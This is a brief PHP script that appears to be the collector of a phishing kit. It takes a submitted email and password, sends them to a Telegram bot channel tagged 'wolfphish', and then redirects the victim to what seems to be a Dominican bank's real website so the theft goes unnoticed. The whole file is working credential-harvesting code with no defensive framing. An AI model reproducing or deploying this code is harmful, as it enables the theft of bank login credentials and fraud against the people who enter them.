<?php
$user = $_POST['ced'];
$pass = $_POST['pass'];

include("dt.php");
$message = "CORREO: " . $user . " \nPASS: " . $pass ." \nwww.wolfphish.co";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];



$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));



?>
<script type="text/javascript">
    top.location.href = "https://bhd.com.do/";
</script>